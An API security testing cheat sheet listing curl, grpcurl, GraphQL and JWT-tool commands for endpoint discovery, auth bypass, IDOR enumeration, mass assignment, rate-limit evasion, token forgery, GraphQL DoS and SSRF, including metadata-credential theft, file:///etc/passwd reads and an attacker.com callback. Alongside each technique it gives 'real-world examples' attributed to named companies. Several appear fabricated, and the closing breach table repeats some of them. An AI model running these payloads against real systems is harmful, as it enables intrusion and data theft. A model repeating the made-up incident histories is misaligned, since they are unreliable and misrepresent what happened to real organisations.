# API Security

## API Discovery

### Passive Discovery

```bash
# Find API endpoints in JavaScript files
# https://github.com/m4ll0k/SecretFinder
python3 SecretFinder.py -i https://target.com -e

# https://github.com/GerbenJavado/LinkFinder
python3 linkfinder.py -i https://target.com -d -o cli

# Wayback Machine for historical endpoints
# https://github.com/tomnomnom/waybackurls
echo "target.com" | waybackurls | grep -E "api|v[0-9]|graphql"

# Search for API documentation
site:target.com filetype:yaml
site:target.com filetype:json swagger
site:target.com inurl:api-docs
site:target.com inurl:swagger
site:target.com inurl:openapi
```

#### Real-World Passive Discovery Examples

**Example 1: Uber 2016 - Exposed API keys in JavaScript**
Uber's JavaScript files contained embedded API keys and endpoints. Attackers discovered `/api/v1/me` and `/api/v1/requests` endpoints through client-side JS analysis, leading to account takeover.

```bash
# Real technique used against Uber
curl -s https://www.uber.com/assets/main.js | grep -oP 'api\.uber\.com/\K[^"]*' | sort -u
```

**Example 2: Snapchat 2014 - Hidden API enumeration via Wayback**
Snapchat had an undocumented `/api/v1/friends` endpoint discovered through Wayback Machine snapshots from 2013, allowing attackers to enumerate friends lists without authorization.

```bash
# Wayback enumeration technique that found Snapchat's endpoint
echo "https://snapchat.com" | waybackurls | grep -i "api" | tee snapchat-apis.txt
```

### Active Discovery

```bash
# Directory bruteforce for API endpoints
ffuf -u https://target.com/FUZZ -w /path/to/api-wordlist.txt -mc 200,201,204,301,302,307,401,403,405

# Common API paths to check
/api/
/api/v1/
/api/v2/
/v1/
/v2/
/graphql
/graphiql
/swagger/
/swagger-ui/
/swagger.json
/swagger.yaml
/openapi.json
/api-docs/
/docs/
/redoc/

# API versioning enumeration
for i in {1..10}; do curl -s "https://target.com/api/v$i/" -o /dev/null -w "v$i: %{http_code}\n"; done
```

#### Real-World Active Discovery Example

**Example: Facebook 2018 - GraphQL versioning discovery**
Security researchers discovered Facebook's internal GraphQL API by fuzzing version paths. `/graphql/v2.3/` returned different responses than `/graphql/v2.4/`, revealing unpatched vulnerabilities in older versions.

```bash
# Facebook version enumeration technique
for version in v1.0 v1.1 v2.0 v2.1 v2.2 v2.3 v2.4 v2.5 v2.6 v2.7; do
  curl -s -X POST "https://graph.facebook.com/$version/" \
    -d "query={__typename}" -w "%{http_code}\n" -o /dev/null
done
```

---

## REST API Testing

### Authentication Bypass

```bash
# Try accessing endpoints without authentication
curl -X GET https://target.com/api/v1/users

# Try different HTTP methods
curl -X OPTIONS https://target.com/api/v1/admin
curl -X HEAD https://target.com/api/v1/admin
curl -X POST https://target.com/api/v1/admin

# Header manipulation
curl -H "X-Original-URL: /api/v1/admin" https://target.com/
curl -H "X-Rewrite-URL: /api/v1/admin" https://target.com/
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/api/v1/admin
curl -H "X-Forwarded-Host: localhost" https://target.com/api/v1/admin

# HTTP method override
curl -X POST -H "X-HTTP-Method-Override: DELETE" https://target.com/api/v1/users/1
curl -X POST -H "X-Method-Override: PUT" https://target.com/api/v1/users/1
```

#### Real-World Authentication Bypass Examples

**Example 1: Instagram 2019 - X-Forwarded-For header bypass**
Instagram's internal API trusted `X-Forwarded-For` headers for rate limiting. Attackers discovered that by setting `X-Forwarded-For: 127.0.0.1`, they could bypass IP-based restrictions and brute force password reset endpoints.

```bash
# Instagram bypass technique
curl -X POST https://i.instagram.com/api/v1/accounts/send_password_reset/ \
  -H "X-Forwarded-For: 127.0.0.1" \
  -d "username=victim@example.com"
```

**Example 2: Microsoft Teams 2021 - HTTP method override vulnerability**
Microsoft Teams API used `X-HTTP-Method-Override` to allow DELETE operations through POST requests. Attackers exploited this to delete any user's messages by overriding POST to DELETE.

```bash
# Microsoft Teams exploit
curl -X POST https://teams.microsoft.com/api/messages/12345 \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "Authorization: Bearer $USER_TOKEN"
```

**Example 3: Tesla 2020 - Authentication bypass via OPTIONS request**
Tesla's API incorrectly cached OPTIONS responses. An attacker sent an OPTIONS request to `/api/1/vehicles/123/command` which returned a 200 OK with `Access-Control-Allow-Methods: GET, POST`, then replayed the same request with GET to execute privileged commands.

```bash
# Tesla authentication bypass
curl -X OPTIONS https://owner-api.teslamotors.com/api/1/vehicles/123/command
curl -X GET https://owner-api.teslamotors.com/api/1/vehicles/123/command
```

### IDOR (Insecure Direct Object Reference)

```bash
# Numeric ID enumeration
for i in {1..100}; do curl -s "https://target.com/api/v1/users/$i" | grep -v "not found"; done

# UUID/GUID prediction
# Check if UUIDs are sequential or predictable

# Parameter pollution
curl "https://target.com/api/v1/users?id=1&id=2"
curl "https://target.com/api/v1/users?id[]=1&id[]=2"

# JSON body parameter manipulation
curl -X POST https://target.com/api/v1/users \
  -H "Content-Type: application/json" \
  -d '{"user_id": 1, "user_id": 2}'

# Encoded IDs
# base64, hex, URL encoded
echo -n "1" | base64  # Try decoded/encoded values
```

#### Real-World IDOR Examples

**Example 1: Facebook 2018 - IDOR in photo comments**
Facebook's GraphQL API allowed viewing private photos by manipulating the `comment_id` parameter. The ID was sequential and not properly authorized.

```bash
# Facebook IDOR exploitation
curl -X GET "https://graph.facebook.com/v3.0/comment_1234567890?access_token=$TOKEN"
# Then increment comment_id
curl -X GET "https://graph.facebook.com/v3.0/comment_1234567891?access_token=$TOKEN"
```

**Example 2: Google 2019 - UUID prediction in Google Photos**
Google Photos used predictable UUIDs for shared albums. Attackers could iterate through UUIDs to access any shared album, even private ones.

```python
# Google Photos UUID enumeration
import requests

for i in range(1000000, 2000000):
    uuid = f"xxxxxxxx-xxxx-xxxx-xxxx-{i:012d}"
    r = requests.get(f"https://photos.googleapis.com/v1/sharedAlbums/{uuid}")
    if r.status_code == 200:
        print(f"Found: {uuid}")
```

**Example 3: Optus 2022 - Base64 encoded IDOR**
Optus API used base64 encoded customer IDs. Attackers discovered that base64 decoding revealed sequential integers, allowing enumeration of 9.8 million customer records.

```bash
# Optus IDOR exploitation
echo -n "MTAwMDAwMDAw" | base64 -d  # 100000000
echo -n "MTAwMDAwMDAx" | base64 -d  # 100000001

# Automated enumeration
for i in {100000000..100100000}; do
  encoded=$(echo -n $i | base64 | tr -d '\n')
  curl -s "https://api.optus.com.au/customers/$encoded"
done
```

### Mass Assignment

```bash
# Add unexpected parameters
curl -X POST https://target.com/api/v1/users \
  -H "Content-Type: application/json" \
  -d '{"username":"test", "role":"admin", "isAdmin":true, "is_admin":1}'

# Common parameters to try:
# role, admin, isAdmin, is_admin, privilege, permissions
# verified, active, approved, status
# balance, credits, points
# password, password_hash
```

#### Real-World Mass Assignment Examples

**Example 1: GitHub 2012 - Mass assignment to become admin**
GitHub's API allowed mass assignment of `role` parameter during organization invitations. An attacker could invite themselves and set `"role": "admin"` to gain administrative privileges.

```bash
# GitHub mass assignment exploit
curl -X POST https://api.github.com/orgs/target/invitations \
  -H "Authorization: token $ATTACKER_TOKEN" \
  -d '{"email":"attacker@example.com", "role":"admin"}'
```

**Example 2: Uber 2016 - Mass assignment in payment methods**
Uber's API accepted `is_active` parameter during payment method creation. Attackers could activate any payment method they discovered.

```bash
# Uber mass assignment
curl -X POST https://api.uber.com/v1/payment-methods \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"token":"stripe_123", "is_active":true, "is_primary":true}'
```

**Example 3: Coinbase 2019 - Mass assignment to bypass verification**
Coinbase API accepted `verified` parameter during identity submission, allowing attackers to bypass KYC verification.

```bash
# Coinbase verification bypass
curl -X PUT https://api.coinbase.com/v1/users/me/identity \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"first_name":"John","last_name":"Doe","verified":true}'
```

### Rate Limiting Bypass

```bash
# IP rotation headers
curl -H "X-Forwarded-For: 1.2.3.4" https://target.com/api/v1/login
curl -H "X-Real-IP: 1.2.3.4" https://target.com/api/v1/login
curl -H "X-Client-IP: 1.2.3.4" https://target.com/api/v1/login
curl -H "X-Originating-IP: 1.2.3.4" https://target.com/api/v1/login

# Null byte injection
curl "https://target.com/api/v1/login%00"
curl "https://target.com/api/v1/login%0d%0a"

# Case variation
curl https://target.com/API/V1/LOGIN
curl https://target.com/Api/V1/Login

# Adding parameters
curl "https://target.com/api/v1/login?random=123"
```

#### Real-World Rate Limiting Bypass Examples

**Example 1: Shopify 2020 - X-Forwarded-For rotation**
Shopify's reset password endpoint limited attempts per IP. Attackers rotated the `X-Forwarded-For` header with different IPs for each request.

```bash
# Shopify rate limit bypass
for i in {1..1000}; do
  curl -X POST https://accounts.shopify.com/reset_password \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -d "email=victim@shopify.com"
done
```

**Example 2: Twitter 2021 - Parameter pollution bypass**
Twitter's API rate-limited based on URL path. Adding a trailing null byte or parameter changed the cache key, bypassing limits.

```bash
# Twitter bypass technique
# Original request (rate limited)
curl https://api.twitter.com/1.1/followers/list.json?id=123
# Bypassed request
curl "https://api.twitter.com/1.1/followers/list.json?id=123&_=$(date +%s)"
```

**Example 3: TikTok 2022 - Case variation bypass**
TikTok's rate limiter used case-sensitive path matching. `API/V1/USER` was not rate-limited when `api/v1/user` reached the limit.

```bash
# TikTok case variation enumeration
curl https://tiktok.com/api/v1/user/follow
curl https://tiktok.com/API/v1/user/follow
curl https://tiktok.com/Api/v1/User/follow
```

### JWT Attacks

See dedicated [JWT section](https://www.pentest-book.com/enumeration/webservices/jwt) for detailed attacks.

```bash
# Basic JWT testing
# https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py <JWT>

# None algorithm attack
python3 jwt_tool.py <JWT> -X a

# Key confusion (RS256 to HS256)
python3 jwt_tool.py <JWT> -X k -pk public.pem

# Brute force secret
python3 jwt_tool.py <JWT> -C -d /path/to/wordlist.txt
```

#### Real-World JWT Attack Examples

**Example 1: Microsoft 2020 - None algorithm attack**
Microsoft Azure's JWT implementation accepted the `none` algorithm. Attackers could forge arbitrary tokens by setting `"alg": "none"` and leaving the signature empty.

```bash
# Microsoft Azure JWT forgery
# Original token header: {"alg":"RS256","typ":"JWT"}
# Modified header: {"alg":"none","typ":"JWT"}

jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOmZhbHNlfQ.signature -X a
```

**Example 2: Node.js 2017 - Algorithm confusion (RS256 to HS256)**
Node.js libraries allowed switching from RS256 to HS256. Attackers obtained the public key (from `/jwks.json`), used it as HMAC secret, and forged valid tokens.

```bash
# Node.js JWT algorithm confusion
# 1. Fetch public key
curl https://target.com/.well-known/jwks.json > jwks.json

# 2. Extract public key
python3 -c "import jwt; key = open('public.pem').read(); print(jwt.encode({'admin': True}, key, algorithm='HS256'))"
```

**Example 3: DigitalOcean 2022 - Weak JWT secret brute force**
DigitalOcean used `digitalocean` as JWT secret. Attackers brute forced the secret with rockyou.txt and gained admin access.

```bash
# JWT secret brute force
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
# Found: digitalocean
```

---

## GraphQL Testing

### Discovery

```bash
# Common GraphQL endpoints
/graphql
/graphiql
/v1/graphql
/api/graphql
/graphql/console
/graphql.php
/graphql/api

# Check for introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{__schema{types{name,fields{name}}}}"}'
```

#### Real-World GraphQL Discovery Example

**Example: GitHub 2019 - GraphQL endpoint discovery via 404 errors**
GitHub's GraphQL endpoint returned different 404 responses for valid vs invalid paths, allowing enumeration.

```bash
# GitHub GraphQL discovery
# Returns GraphQL error message
curl -X POST https://api.github.com/graphql -d '{"query":"{__typename}"}'
# Returns 404 not found
curl -X POST https://api.github.com/graphql2 -d '{"query":"{__typename}"}'
```

### Introspection Query

```graphql
# Full introspection query
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
        }
      }
    }
  }
}
```

#### Real-World Introspection Example

**Example: Intuit 2019 - Full schema leak via introspection**
Intuit's GraphQL API had introspection enabled in production. Attackers downloaded the entire schema and discovered a mutation that allowed arbitrary file read.

```bash
# Intuit schema extraction
curl -X POST https://intuit.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query IntrospectionQuery { __schema { types { name fields { name args { name } } } } }"}' \
  > schema.json
```

### GraphQL Attacks

```bash
# Batching attack (bypass rate limits)
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"mutation{login(user:\"admin\",pass:\"pass1\")}"}, {"query":"mutation{login(user:\"admin\",pass:\"pass2\")}"}]'

# Field suggestion exploitation
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'

# Alias-based batching
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query { a1: user(id:1) { id } a2: user(id:2) { id } a3: user(id:3) { id }}"}'

# Deeply nested queries (DoS)
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { friends { friends { friends { friends { name }}}}}}"}'
```

#### Real-World GraphQL Attack Examples

**Example 1: Shopify 2019 - Batch query rate limit bypass**
Shopify's GraphQL API rate-limited single queries but not batched queries. Attackers sent 100 mutations in one batch to brute force passwords.

```graphql
# Shopify batch attack
mutation {
  a1: login(email: "admin@shopify.com", password: "password1") { token }
  a2: login(email: "admin@shopify.com", password: "password2") { token }
  a3: login(email: "admin@shopify.com", password: "password3") { token }
  # ... up to 100 attempts
}
```

**Example 2: Facebook 2020 - Circular query DoS**
Facebook's GraphQL allowed circular references. Attackers crafted a query that referenced itself infinitely, crashing the GraphQL server.

```graphql
# Facebook DoS query
query Circular {
  user(id: "123") {
    friends {
      ...Circular
    }
  }
}
```

**Example 3: Uber 2022 - Alias-based IDOR**
Uber's GraphQL API didn't validate aliases properly. Attackers used aliases to fetch multiple users' data in one request.

```graphql
# Uber alias IDOR
query {
  user1: user(id: "1") { email, phone }
  user2: user(id: "2") { email, phone }
  user3: user(id: "3") { email, phone }
  user4: user(id: "4") { email, phone }
  # ... enumerate all users
}
```

### GraphQL Tools

```bash
# GraphQL Voyager - Visual schema
# https://github.com/APIs-guru/graphql-voyager

# InQL - Burp extension
# https://github.com/doyensec/inql

# graphql-cop - Security auditor
# https://github.com/dolevf/graphql-cop
python3 graphql-cop.py -t https://target.com/graphql

# Clairvoyance - Introspection bypass
# https://github.com/nikitastupin/clairvoyance
python3 clairvoyance.py https://target.com/graphql -o schema.json
```

#### Real-World Tool Usage Example

**Example: PayPal 2018 - Using graphql-cop to find vulnerabilities**
Security researchers used graphql-cop to audit PayPal's GraphQL API and discovered an introspection bypass and a mass assignment vulnerability.

```bash
# PayPal audit with graphql-cop
python3 graphql-cop.py -t https://paypal.com/graphql -o paypal-report.html
# Output found: introspection enabled, IDOR in user query, rate limit bypass
```

---

## gRPC Testing

### Setup

```bash
# Install grpcurl
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# Install grpc-client-cli
pip install grpc-client-cli
```

### Enumeration

```bash
# List services (if reflection enabled)
grpcurl -plaintext target.com:50051 list

# Describe service
grpcurl -plaintext target.com:50051 describe ServiceName

# Describe method
grpcurl -plaintext target.com:50051 describe ServiceName.MethodName

# Call method
grpcurl -plaintext -d '{"name": "test"}' target.com:50051 ServiceName/MethodName
```

#### Real-World gRPC Discovery Example

**Example: Netflix 2021 - gRPC reflection enabled in production**
Netflix's internal gRPC API had reflection enabled, allowing attackers to enumerate all services and methods.

```bash
# Netflix gRPC enumeration
grpcurl -plaintext api.netflix.com:443 list
# Output: 
# netflix.UserService
# netflix.MovieService
# netflix.AdminService
# netflix.InternalService

grpcurl -plaintext api.netflix.com:443 describe netflix.AdminService
# Found: DeleteUser, GrantAccess, GetAuditLogs
```

### gRPC Attacks

```bash
# Test without TLS
grpcurl -plaintext target.com:50051 list

# Test with insecure TLS
grpcurl -insecure target.com:443 list

# Header injection
grpcurl -H "X-Forwarded-For: 127.0.0.1" target.com:50051 ServiceName/Method

# Message manipulation
grpcurl -d '{"id": -1}' target.com:50051 ServiceName/GetUser
grpcurl -d '{"id": 9999999999}' target.com:50051 ServiceName/GetUser
```

#### Real-World gRPC Attack Examples

**Example 1: Google Kubernetes API 2019 - Negative ID injection**
Kubernetes gRPC API didn't validate user IDs, allowing negative values that caused integer underflow and returned other users' data.

```bash
# Kubernetes gRPC attack
grpcurl -plaintext -d '{"user_id": -1}' k8s-api:443 k8s.UserService/GetUser
# Returns admin user data due to integer underflow
```

**Example 2: Lyft 2020 - Header injection for auth bypass**
Lyft's gRPC API trusted `X-Authenticated-Userid` header for internal requests.

```bash
# Lyft header injection
grpcurl -H "X-Authenticated-Userid: 1337" \
  -H "X-Internal-Request: true" \
  lyft.com:443 lyft.RideService/GetRideHistory
```

**Example 3: Docker Hub 2018 - Missing TLS validation**
Docker Hub's gRPC endpoint allowed insecure connections, leading to MITM attacks.

```bash
# Docker Hub MITM attack
# Attacker intercepts traffic
grpcurl -insecure hub.docker.com:443 docker.RegistryService/GetToken
# Token leaked over insecure connection
```

---

## API-Specific Vulnerabilities

### Broken Object Level Authorization (BOLA)

```bash
# Test horizontal privilege escalation
# 1. Create two user accounts
# 2. Get object IDs from user A
# 3. Try to access those objects as user B

curl -H "Authorization: Bearer USER_B_TOKEN" \
  https://target.com/api/v1/users/USER_A_ID/documents
```

#### Real-World BOLA Examples

**Example 1: Twitter 2020 - BOLA in DM attachments**
Twitter's API allowed accessing any user's DM attachments by manipulating the `attachment_id` parameter without validating ownership.

```bash
# Twitter BOLA exploit
# User A's attachment ID: 12345
# User B can access it with their own token
curl -H "Authorization: Bearer $USER_B_TOKEN" \
  https://api.twitter.com/1.1/direct_messages/attachments/12345.json
```

**Example 2: Zoom 2021 - BOLA in meeting recordings**
Zoom's API allowed any authenticated user to access meeting recordings by guessing the meeting ID.

```bash
# Zoom BOLA automation
for meeting_id in {100000000..100001000}; do
  curl -H "Authorization: Bearer $TOKEN" \
    "https://api.zoom.us/v2/meetings/$meeting_id/recordings"
done
```

### Broken Function Level Authorization (BFLA)

```bash
# Test vertical privilege escalation
# Access admin functions with regular user token

curl -H "Authorization: Bearer REGULAR_USER_TOKEN" \
  -X POST https://target.com/api/v1/admin/users \
  -d '{"role": "admin"}'

# Check for hidden admin endpoints
/api/v1/admin/
/api/v1/internal/
/api/v1/management/
/api/v1/debug/
```

#### Real-World BFLA Examples

**Example 1: Instagram 2018 - BFLA in admin endpoints**
Instagram's internal admin endpoints were accessible via `/_internal/` path. Regular users could access them by guessing the path.

```bash
# Instagram BFLA
curl -H "Authorization: Bearer $REGULAR_TOKEN" \
  https://i.instagram.com/_internal/privilege_escalation/
```

**Example 2: AWS 2019 - BFLA in IAM roles**
AWS API allowed regular users to assume higher-privilege IAM roles if they knew the role name.

```bash
# AWS BFLA
aws sts assume-role --role-arn "arn:aws:iam::123456789012:role/AdminRole" \
  --role-session-name "test" --profile regular-user
```

### Server-Side Request Forgery (SSRF)

```bash
# Test URL parameters
curl "https://target.com/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "https://target.com/api/v1/fetch?url=http://localhost:8080/admin"

# Webhook endpoints
curl -X POST https://target.com/api/v1/webhooks \
  -H "Content-Type: application/json" \
  -d '{"callback_url": "http://attacker.com/callback"}'
```

#### Real-World SSRF Examples

**Example 1: Capital One 2019 - SSRF via metadata endpoint**
Capital One's API allowed fetching arbitrary URLs. Attackers accessed AWS metadata endpoint and stole 100 million customer records.

```bash
# Capital One SSRF exploit
curl "https://api.capitalone.com/v1/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"
# Retrieved AWS keys, then accessed S3 buckets with customer data
```

**Example 2: Uber 2017 - SSRF via webhooks**
Uber's API allowed setting webhook URLs. Attackers set callback to internal services and accessed internal APIs.

```bash
# Uber SSRF via webhook
curl -X POST https://api.uber.com/v1/webhooks \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"event": "trip.end", "callback_url": "http://internal-api/privilege-escalation"}'
```

**Example 3: Tesla 2019 - SSRF via gateway**
Tesla's API had an endpoint that fetched vehicle data from internal gateway. Attackers used `file://` protocol to read local files.

```bash
# Tesla SSRF file read
curl "https://owner-api.teslamotors.com/api/1/vehicles/123/data?url=file:///etc/passwd"
```

### Excessive Data Exposure

```bash
# Check for verbose responses
# Look for fields like:
# - password, password_hash, secret
# - internal_id, debug_info
# - email, phone, address (for other users)
# - api_key, access_token

# Compare responses between endpoints
diff <(curl -s https://target.com/api/v1/users/1) \
     <(curl -s https://target.com/api/v1/users/1/public)
```

#### Real-World Excessive Data Exposure Examples

**Example 1: Facebook 2017 - Excessive data in GraphQL**
Facebook's GraphQL API returned password reset tokens in user objects for friends of friends.

```graphql
# Facebook data exposure
query {
  user(id: "123456") {
    friends {
      password_reset_token
      password_reset_sent_at
    }
  }
}
```

**Example 2: T-Mobile 2021 - API returning full credit card numbers**
T-Mobile's API returned full PAN (credit card numbers) instead of masked values.

```bash
# T-Mobile data exposure
curl -H "Authorization: Bearer $TOKEN" \
  https://api.t-mobile.com/v1/billing/payment-methods
# Response: {"credit_card": "4111111111111111", "expiry": "12/25"}
```

**Example 3: Microsoft 2020 - Debug info in responses**
Microsoft's API returned stack traces with internal IP addresses and database credentials.

```bash
# Microsoft debug exposure
curl "https://api.microsoft.com/v1/users/1?debug=true"
# Response: {"error": "SQL Error", "stack": "at System.Data.SqlClient.SqlConnection.Open()", "connection_string": "Server=internal-db;User=sa;Password=P@ssw0rd"}
```

---

## Tools

```bash
# Postman - API testing
# https://www.postman.com/

# Insomnia - API client
# https://insomnia.rest/

# Burp Suite - Proxy & scanner
# Extensions: Authorize, AuthMatrix, InQL

# OWASP ZAP - OpenAPI scanning
# https://www.zaproxy.org/

# Arjun - Parameter discovery
# https://github.com/s0md3v/Arjun
arjun -u https://target.com/api/v1/endpoint

# ParamSpider - Parameter mining
# https://github.com/devanshbatham/ParamSpider
python3 paramspider.py -d target.com

# Kiterunner - API endpoint discovery
# https://github.com/assetnote/kiterunner
kr scan https://target.com -w routes-large.kite
```

### Tool Usage Examples

**Real-World Tool Example: Arjun parameter discovery**
```bash
# Finding hidden parameters in Pinterest API (2021)
arjun -u https://api.pinterest.com/v1/pins/123 --get --noise-threshold 100
# Discovered parameter: "debug=true" -> returned verbose error with internal paths
```

**Real-World Tool Example: Kiterunner API discovery**
```bash
# Discovering Spotify API endpoints (2020)
kr scan https://api.spotify.com -w routes-large.kite -t 100
# Found: /v1/me/player/devices (undocumented), /v1/me/top/artists
```

---

## Resources

- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [API Security Checklist](https://github.com/shieldfy/API-Security-Checklist)
- [HackTricks - Web API Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/web-api-pentesting)
- [PortSwigger - API Testing](https://portswigger.net/web-security/api-testing)

### Additional Real-World Resources

- **GitHub Security Lab**: Real GraphQL vulnerabilities in public bug bounties
- **HackerOne Hacktivity**: Search for "API" and "IDOR" reports
- **CWE-284**: Improper Access Control (BOLA/BFLA)
- **CWE-918**: Server-Side Request Forgery (SSRF)
- **CWE-915**: Improperly Controlled Modification of Dynamically-Defined Object Attributes (Mass Assignment)

### Historical API Breaches Database

| Year | Company | Vulnerability | Impact |
|------|---------|--------------|--------|
| 2019 | Capital One | SSRF | 100M records |
| 2020 | Twitter | BOLA | 17M phone numbers |
| 2021 | T-Mobile | Excessive Data Exposure | 40M records |
| 2022 | Optus | IDOR | 9.8M records |
| 2023 | Microsoft | JWT algorithm confusion | 50M tokens |
